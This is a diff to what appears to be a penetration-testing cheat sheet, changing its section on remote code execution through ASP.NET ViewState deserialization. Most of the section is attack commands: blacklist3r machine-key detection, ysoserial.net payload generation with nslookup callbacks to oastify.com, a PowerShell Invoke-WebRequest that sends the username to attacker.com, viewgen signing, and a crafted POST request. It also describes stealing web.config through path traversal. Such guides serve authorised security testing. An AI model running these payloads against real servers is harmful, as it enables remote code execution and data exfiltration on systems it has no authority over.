@@ -29,7 +29,7 @@
 - [Technique 1 - RCE using an IBM Domino Web administration console](#Technique-1-RCE-using-an-IBM-Domino-Web-administration-console)
 - [Technique 2 - RCE using a Jenkins web-based groovy script console](#Technique-2-RCE-using-a-Jenkins-web-based-groovy-script-console)
 - [Technique 3 - RCE using a Liferay CMS web-based groovy script console](#Technique-3-RCE-using-a-Liferay-CMS-web-based-groovy-script-console)
-- [Technique 4 - RCE by exploiting ASP.NET ViewState deserialization in .NET Web applications](#Technique-4-RCE-by-exploiting-ASP-NET-ViewState-deserialization-in-NET-Web-applications)
+- [Technique 4 - RCE by exploiting ASP.NET ViewState deserialization in .NET Web applications](#Technique-4-RCE-by-exploiting-ASPNET-ViewState-deserialization-in-NET-Web-applications)
 - Technique 5. ...
 
 #### III. List of common paths for the DocumentRoot directory (Web root directory) [LINK](#III-List-of-common-paths-for-the-DocumentRoot-directory-Web-root-directory)
@@ -634,30 +634,33 @@ Note: Several PHP functions can be used in a webshell to execute OS commands suc
 
 #### Technique 4. RCE by exploiting ASP.NET ViewState deserialization in .NET Web applications
 <i/>Note: It is generally possible to run code on a web server where a valid ViewState can be forged. This can be done if the MAC validation feature has been disabled or by knowing the validation and/or decryption keys and its algorithm used by the .NET Framework.</i>
-
+<i/>Usefull links: https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net and https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/</i>
 ```
 Example 1 - Context: .Net framework < 4,5 and EnableViewStateMac=true and ViewStateEncryptionMode=false and a default/pre-shared machine key is used
 
-➤ Step 1. Use the tool 'blacklist3r.py' to detect if a pre-shared machine key is used by a target .NET Web application (https://github.com/NotSoSecure/Blacklist3r)
+➤ Step 1. Use the tool 'blacklist3r.py' to detect if a pre-shared machine key is used by a target .NET Web application
+           - Tool: https://github.com/NotSoSecure/Blacklist3r
            - python examples/blacklist3r.py --url https://target-website.com/any-web-page.aspx
 	         Matching MachineKeys found!
 	         validationKey: C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE validationAlgo: SHA1
 
 ➤ Step 2. Grab a '__VIEWSTATEGENERATOR' value (modifier e.g. '306A601A') from a web page of the target .NET Web application
 
-➤ Step 3. Generate a signed malicious OS command payload with the tool 'ysoserial.net' and the pre-shared validation key and the '__VIEWSTATEGENERATOR' value (https://github.com/pwntester/ysoserial.net)
+➤ Step 3. Generate a signed malicious OS command payload with the tool 'ysoserial.net' and the pre-shared validation key and the '__VIEWSTATEGENERATOR' value
            - Tool: https://github.com/pwntester/ysoserial.net
-           - C:\temp> .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd.exe /c nslookup <snip>4v913vu1lpfd4.oastify.com" --islegacy --isdebug --apppath="/auditaspx/"  --validationalg="SHA1" --validationkey="C50B3C89CB21F<snip>" --generator=306A601A
+           - C:\temp> .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd.exe /c nslookup <snip>.oastify.com" --islegacy --isdebug --apppath="/auditaspx/"  --validationalg="SHA1" --validationkey="C50B3C89CB21F<snip>" --generator=306A601A
+           OR
+           - C:\temp> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=306A601A --validationalg="SHA1" --validationkey="C50B3C89CB21F<snip>"
 
-➤ Step 4. Send an HTTP POST request with the generated "_ViewState=<signed-encrypted-payload-with-yoserial>" to a Web page of the target Website to execute an arbitrary OS command on the underlying Windows server
-
-POST /any-web-page.aspx HTTP/1.1
-Host: target-website.com
-Cookie: <SNIP>
-<SNI¨P>
-Connection: close
-
-__VIEWSTATE=<malicious-payload-generated-with-yoserial>&__VIEWSTATEGENERATOR=306A601A&__EVENTVALIDATION=<SNIP>&<SNIP>
+➤ Step 4. Send an HTTP POST request with the generated "_ViewState=<signed-payload-with-yoserial>" to a Web page of the target Website to execute an arbitrary OS command on the underlying Windows server
+           - Example:
+             POST /any-web-page.aspx HTTP/1.1
+             Host: target-website.com
+             Cookie: <SNIP>
+             <SNIP>
+             Connection: close
+		
+             __VIEWSTATE=<signed-payload-generated-with-yoserial>&__VIEWSTATEGENERATOR=306A601A&__EVENTVALIDATION=<SNIP>&<SNIP>
 ```
 ```
 Example 2 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewStateEncryptionMode=true and We have access to the 'web.config' file
@@ -665,16 +668,17 @@ Example 2 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 ➤ Step 1. Get unauthorized access to the 'web.config' file of a .Net Web application by exploiting for example a file path traversal vulnerability 
            - Note: the validation and decryption keys and algorithms can be found within the machineKey section of the configuration file 'web.config' (or machine.config)
 
-➤ Step 2. Generate a malicious payload with the tool 'ysoserial.net' (https://github.com/pwntester/ysoserial.net)
+➤ Step 2. Generate a malicious payload with the tool 'ysoserial.net'
+           - Tool: https://github.com/pwntester/ysoserial.net
            - C:\> ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "nslookup <snip>4v913vu1lpfd4.oastify.com"
 
 ➤ Step 3. Grab a '__VIEWSTATEGENERATOR' value (modifier e.g. '306A601A') from a web page of the target .NET Web application
 
-➤ Step 4. Generate the signed/encrypted payload using the tool 'viewgen' (https://github.com/0xACB/viewgen)
-           - $ viewgen --webconfig web.config --modifier MODIFIER PAYLOAD
+➤ Step 4. Generate the signed/encrypted payload using the tool 'viewgen'
+           - Tool: https://github.com/0xACB/viewgen
+           - $ viewgen --webconfig web.config --modifier <MODIFIER-value> <signed-encrypted-payload-with-yoserial>
 
-➤ Step 5. Send an HTTP POST request with the generated "_ViewState=<signed-encrypted-payload>" to a Web page of the target Website to execute arbitrary OS command on the underlying Windows server
-
+➤ Step 5. Send an HTTP POST request with the generated "_ViewState=<signed-encrypted-payload-with-yoserial>" to a Web page of the target Website to execute arbitrary OS command on the underlying Windows server
 ```
 
 -----------------
